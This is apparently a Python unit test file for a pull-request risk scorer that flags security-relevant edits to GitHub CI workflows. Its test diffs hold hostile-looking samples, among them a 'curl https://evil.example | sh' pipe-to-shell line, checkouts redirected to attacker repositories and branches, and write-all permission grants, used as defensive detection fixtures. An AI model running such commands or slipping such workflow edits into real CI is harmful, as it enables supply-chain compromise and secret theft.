from __future__ import annotations

import importlib.util
import os
import pathlib
import subprocess
import tempfile
import typing
import unittest


def _load_module() -> typing.Any:
    # The script's filename is hyphenated, so it cannot be imported by name.
    spec = importlib.util.spec_from_file_location(
        "compute_pr_risk",
        pathlib.Path(__file__).with_name("compute-pr-risk.py"),
    )
    assert spec is not None
    assert spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


cpr = _load_module()

WORKFLOW = ".github/workflows/ci.yaml"
BENIGN_CI_TITLE = "ci: Bump the test job timeout"


def _diff(*changed: str) -> str:
    header = [
        f"--- a/{WORKFLOW}",
        f"+++ b/{WORKFLOW}",
        "@@ -1,3 +1,2 @@",
    ]
    return "\n".join(header + list(changed))


class DiffTouchesCiSecurityTests(unittest.TestCase):
    def test_env_var_removal_is_benign(self) -> None:
        diff = _diff('-          UV_LOCKED: "1"')
        self.assertFalse(cpr.diff_touches_ci_security(diff))

    def test_timeout_and_matrix_tweaks_are_benign(self) -> None:
        diff = _diff(
            "-    timeout-minutes: 5",
            "+    timeout-minutes: 10",
            '+          - python-version: "3.14"',
        )
        self.assertFalse(cpr.diff_touches_ci_security(diff))

    def test_new_run_step_is_dangerous(self) -> None:
        diff = _diff("+      - run: curl https://evil.example | sh")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_action_pin_change_is_dangerous(self) -> None:
        diff = _diff("+      - uses: some/action@main")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_trigger_widening_is_dangerous(self) -> None:
        diff = _diff("+  pull_request_target:")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_permissions_change_is_dangerous(self) -> None:
        diff = _diff("+    permissions: write-all")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_secret_reference_is_dangerous(self) -> None:
        diff = _diff("+          TOKEN: ${{ secrets.PYPI_TOKEN }}")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_shell_appended_inside_existing_run_block_is_dangerous(self) -> None:
        # The `run:` key is unchanged context; the appended shell line carries
        # no dangerous keyword, yet must not slip through as benign.
        diff = _diff("+          curl https://evil.example/x | sh")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_permission_subkey_flip_is_dangerous(self) -> None:
        # `permissions:` block header is unchanged context; only the scope flips.
        diff = _diff("-          contents: read", "+          contents: write")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_id_token_grant_is_dangerous(self) -> None:
        diff = _diff("+          id-token: write")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_checkout_ref_change_is_dangerous(self) -> None:
        # `with:` is unchanged context; the `ref:` sub-key redirects which code
        # a step checks out, so its edit must not slip through as benign.
        diff = _diff("-        ref: main", "+        ref: attacker-branch")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_checkout_repository_change_is_dangerous(self) -> None:
        # Repointing a checkout at another repository is security-relevant even
        # though the `repository:` line carries no dangerous keyword or `${{ }}`.
        diff = _diff("+        repository: attacker/repo")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_container_image_swap_is_dangerous(self) -> None:
        diff = _diff("+      image: ghcr.io/attacker/tool:latest")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_if_guard_removal_is_dangerous(self) -> None:
        diff = _diff("+    if: always()")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_untrusted_context_in_run_is_dangerous(self) -> None:
        diff = _diff('+          echo "${{ github.event.pull_request.title }}"')
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_bare_shell_line_is_dangerous(self) -> None:
        diff = _diff("+          uv publish")
        self.assertTrue(cpr.diff_touches_ci_security(diff))

    def test_unchanged_context_does_not_taint(self) -> None:
        # A `run:` line present only as context (leading space, not +/-) must
        # not flag an otherwise benign env-var edit.
        diff = "\n".join(
            [
                f"--- a/{WORKFLOW}",
                f"+++ b/{WORKFLOW}",
                "@@ -1,4 +1,4 @@",
                "       - run: uv run poe test",
                '-        UV_LOCKED: "1"',
                '+        UV_LOCKED: "0"',
            ],
        )
        self.assertFalse(cpr.diff_touches_ci_security(diff))


class LowRiskBlockersTests(unittest.TestCase):
    def test_benign_ci_tweak_is_low_risk(self) -> None:
        self.assertEqual(
            cpr.low_risk_blockers(
                [WORKFLOW],
                BENIGN_CI_TITLE,
                total_lines=1,
                dangerous_ci=False,
            ),
            [],
        )

    def test_dangerous_ci_is_not_fast_pathed(self) -> None:
        self.assertTrue(
            cpr.low_risk_blockers(
                [WORKFLOW],
                "ci(release): Add a publish step",
                total_lines=5,
                dangerous_ci=True,
            ),
        )

    def test_large_change_is_not_fast_pathed(self) -> None:
        self.assertTrue(
            cpr.low_risk_blockers(
                [WORKFLOW],
                BENIGN_CI_TITLE,
                total_lines=cpr.SMALL_CHANGE_MAX_LINES + 1,
                dangerous_ci=False,
            ),
        )

    def test_wide_change_is_not_fast_pathed(self) -> None:
        self.assertTrue(
            cpr.low_risk_blockers(
                [f"docs/page-{i}.md" for i in range(cpr.SMALL_CHANGE_MAX_FILES + 1)],
                "docs: Rewrite the guide",
                total_lines=10,
                dangerous_ci=False,
            ),
        )

    def test_unsafe_commit_type_is_not_fast_pathed(self) -> None:
        self.assertTrue(
            cpr.low_risk_blockers(
                ["pytest_mergify/utils.py"],
                "feat(spans): Add a resource attribute",
                total_lines=1,
                dangerous_ci=False,
            ),
        )

    def test_breaking_change_is_not_fast_pathed(self) -> None:
        self.assertTrue(
            cpr.low_risk_blockers(
                [WORKFLOW],
                "ci(release)!: Drop the legacy pipeline",
                total_lines=1,
                dangerous_ci=False,
            ),
        )

    def test_non_conventional_title_is_not_fast_pathed(self) -> None:
        self.assertTrue(
            cpr.low_risk_blockers(
                [WORKFLOW],
                "Tweak the CI workflow",
                total_lines=1,
                dangerous_ci=False,
            ),
        )

    def test_scorer_edit_is_not_fast_pathed(self) -> None:
        # The scorer grants the label, so it must never grant its own.
        self.assertTrue(
            cpr.low_risk_blockers(
                [".github/scripts/compute-pr-risk.py"],
                "chore: Relax the size limit",
                total_lines=1,
                dangerous_ci=False,
            ),
        )

    def test_mergify_config_edit_is_not_fast_pathed(self) -> None:
        self.assertTrue(
            cpr.low_risk_blockers(
                [".mergify.yml"],
                "chore: Tweak the queue rules",
                total_lines=1,
                dangerous_ci=False,
            ),
        )

    def test_refactor_of_plugin_source_is_low_risk(self) -> None:
        self.assertEqual(
            cpr.low_risk_blockers(
                ["pytest_mergify/utils.py", "tests/test_utils.py"],
                "refactor(utils): Extract the strtobool helper",
                total_lines=40,
                dangerous_ci=False,
            ),
            [],
        )


class ChangedFilesTests(unittest.TestCase):
    def _git(self, repo: str, *args: str) -> None:
        subprocess.run(
            ["git", "-C", repo, *args],
            check=True,
            capture_output=True,
            env={
                "GIT_AUTHOR_NAME": "t",
                "GIT_AUTHOR_EMAIL": "t@example.com",
                "GIT_COMMITTER_NAME": "t",
                "GIT_COMMITTER_EMAIL": "t@example.com",
                "PATH": "/usr/bin:/bin:/usr/local/bin",
            },
        )

    def test_renamed_workflow_keeps_its_original_path(self) -> None:
        # Rename detection would report `.github/{workflows => scripts}/ci.yaml`,
        # which no `.github/workflows/` prefix test matches — letting a workflow
        # moved out of the tree skip the CI security check entirely.
        with tempfile.TemporaryDirectory() as repo:
            root = pathlib.Path(repo)
            (root / ".github" / "workflows").mkdir(parents=True)
            (root / ".github" / "workflows" / "ci.yaml").write_text(
                "name: ci\njobs:\n  a:\n    runs-on: x\n",
            )
            self._git(repo, "init", "-q")
            self._git(repo, "add", "-A")
            self._git(repo, "commit", "-qm", "init")
            (root / ".github" / "scripts").mkdir()
            self._git(
                repo,
                "mv",
                ".github/workflows/ci.yaml",
                ".github/scripts/ci.yaml",
            )
            self._git(repo, "commit", "-qm", "move")

            cwd = pathlib.Path.cwd()
            try:
                os.chdir(repo)
                paths, _ = cpr.changed_files("HEAD~1", "HEAD")
            finally:
                os.chdir(cwd)

        self.assertIn(".github/workflows/ci.yaml", paths)
        self.assertTrue(
            any(path.startswith(".github/workflows/") for path in paths),
        )


class GitFailureTests(unittest.TestCase):
    def test_failed_git_command_raises(self) -> None:
        # A silent empty result would score as "nothing changed", which is
        # indistinguishable from a safe diff.
        with self.assertRaises(subprocess.CalledProcessError):
            cpr.git("rev-parse", "--verify", "definitely-not-a-ref")


class CommitTypeTests(unittest.TestCase):
    def test_scope_and_case_are_normalized(self) -> None:
        self.assertEqual(cpr.commit_type("Chore(deps): Bump ruff"), "chore")

    def test_plain_sentence_has_no_type(self) -> None:
        self.assertIsNone(cpr.commit_type("Chore up the tests"))


if __name__ == "__main__":
    unittest.main()
